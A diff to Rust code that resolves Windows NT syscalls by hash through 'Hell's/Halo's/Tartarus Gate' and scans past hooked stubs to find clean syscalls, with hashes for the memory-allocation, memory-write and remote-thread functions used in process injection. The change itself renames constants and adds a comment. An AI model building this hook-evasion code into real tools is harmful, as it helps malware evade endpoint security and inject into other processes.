@@ -12,10 +12,10 @@ use windows_sys::Win32::System::{
 
 const NTDLL_HASH: u32 = 0x1edab0ed;
 const NT_OPEN_PROCESS_HASH: u32 = 0x4b82f718;
-const NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0xf783b8ec;
-const NT_PROTECT_VIRTUAL_MEMORY: u32 = 0x50e92888;
-const NT_WRITE_VIRTUAL_MEMORY: u32 = 0xc3170192;
-const NT_CREATE_THREAD_EX: u32 = 0xaf18cfb0;
+const NT_ALLOCATE_VIRTUAL_MEMORY_HASH: u32 = 0xf783b8ec;
+const NT_PROTECT_VIRTUAL_MEMORY_HASH: u32 = 0x50e92888;
+const NT_WRITE_VIRTUAL_MEMORY_HASH: u32 = 0xc3170192;
+const NT_CREATE_THREAD_EX_HASH: u32 = 0xaf18cfb0;
 
 const UP: isize = -32;
 const DOWN: usize = 32;
@@ -45,19 +45,19 @@ mod test {
                 .expect("Failed to call hells_halos_tartarus_gate")
         };
         let nt_allocate_virtual_memory_table = unsafe {
-            hells_halos_tartarus_gate(ntdll_base_address, NT_ALLOCATE_VIRTUAL_MEMORY)
+            hells_halos_tartarus_gate(ntdll_base_address, NT_ALLOCATE_VIRTUAL_MEMORY_HASH)
                 .expect("Failed to call hells_halos_tartarus_gate")
         };
         let nt_protect_virtual_memory_table = unsafe {
-            hells_halos_tartarus_gate(ntdll_base_address, NT_PROTECT_VIRTUAL_MEMORY)
+            hells_halos_tartarus_gate(ntdll_base_address, NT_PROTECT_VIRTUAL_MEMORY_HASH)
                 .expect("Failed to call hells_halos_tartarus_gate")
         };
         let nt_write_virtual_memory_table = unsafe {
-            hells_halos_tartarus_gate(ntdll_base_address, NT_WRITE_VIRTUAL_MEMORY)
+            hells_halos_tartarus_gate(ntdll_base_address, NT_WRITE_VIRTUAL_MEMORY_HASH)
                 .expect("Failed to call hells_halos_tartarus_gate")
         };
         let nt_create_thread_ex_table = unsafe {
-            hells_halos_tartarus_gate(ntdll_base_address, NT_CREATE_THREAD_EX)
+            hells_halos_tartarus_gate(ntdll_base_address, NT_CREATE_THREAD_EX_HASH)
                 .expect("Failed to call hells_halos_tartarus_gate")
         };
 
@@ -204,6 +204,10 @@ pub unsafe fn hells_halos_tartarus_gate(
     //
 
     if vx_table_entry.p_address.add(3).read() == 0xe9 {
+        //
+        // if hooked check the neighborhood to find clean syscall (downwards)
+        //
+
         for idx in 1..500 {
             if vx_table_entry.p_address.add(idx * DOWN).read() == 0x4c
                 && vx_table_entry.p_address.add(1 + idx * DOWN).read() == 0x8b
